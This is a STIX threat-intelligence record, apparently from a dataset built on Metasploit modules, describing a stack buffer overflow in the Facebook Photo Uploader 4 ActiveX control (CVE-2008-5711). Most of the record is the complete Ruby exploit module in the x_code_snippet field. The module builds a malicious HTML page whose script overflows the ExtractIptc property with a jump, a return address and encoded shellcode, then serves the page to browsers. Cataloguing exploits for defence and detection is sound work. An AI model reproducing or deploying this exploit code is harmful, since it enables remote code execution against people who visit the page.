{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e19b4264-eb58-4ed6-93cd-11bc24b00abe",
    "created": "2024-08-14T16:44:36.181711Z",
    "modified": "2024-08-14T16:44:36.181715Z",
    "name": "Facebook Photo Uploader 4 ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Facebook Photo Uploader 4. By sending an overly long string to the \"ExtractIptc()\" property located in the ImageUploader4.ocx (4.5.57.0) Control, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/facebook_extractiptc.rb",
            "external_id": "facebook_extractiptc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-5711"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Facebook Photo Uploader 4 ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Facebook Photo Uploader 4.\n        By sending an overly long string to the \"ExtractIptc()\" property located\n        in the ImageUploader4.ocx (4.5.57.0) Control, an attacker may be able to execute\n        arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-5711' ],\n          [ 'OSVDB', '41073' ],\n          [ 'BID', '27534' ],\n          [ 'EDB', '5049' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 800,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'IE 6 SP0-SP2 / Windows XP SP2 Pro English',     { 'Ret' => 0x74c9de3e } ], # 02/07/08\n        ],\t\t\t\t\t\t\t\t\t               # ./msfpescan -i /tmp/oleacc.dll | grep SEHandler\n      'DisclosureDate' => '2008-01-31',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n      false\n  end\n\n  def check_dependencies\n      use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t  = rand_text_alpha(rand(100) + 1)\n    strname = rand_text_alpha(rand(100) + 1)\n    rand1   = rand_text_alpha(rand(100) + 1)\n    rand2   = rand_text_alpha(rand(100) + 1)\n    rand3   = rand_text_alpha(rand(100) + 1)\n    rand4   = rand_text_alpha(rand(100) + 1)\n\n    # Set the exploit buffer\n    filler  = Rex::Text.to_unescape(rand_text_alpha(2))\n    jmp     = Rex::Text.to_unescape([0x969606eb].pack('V'))\n    ret     = Rex::Text.to_unescape([target.ret].pack('V'))\n    sc      = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Build out the message\n    content = %Q|<html>\n<object classid='clsid:5C6698D9-7BE4-4122-8EC5-291D84DBD4A0' id='#{vname}'></object>\n<script language='javascript'>\n#{rand1} = unescape('#{filler}');\nwhile (#{rand1}.length <= 261) #{rand1} = #{rand1} + unescape('#{filler}');\n#{rand2} = unescape('#{jmp}');\n#{rand3} = unescape('#{ret}');\n#{rand4} = unescape('#{sc}');\n#{strname} = #{rand1} + #{rand2} + #{rand3} + #{rand4};\n#{vname}.ExtractIptc = #{strname};\n</script>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-01-31",
    "x_mitre_platforms": [
        "win'"
    ]
}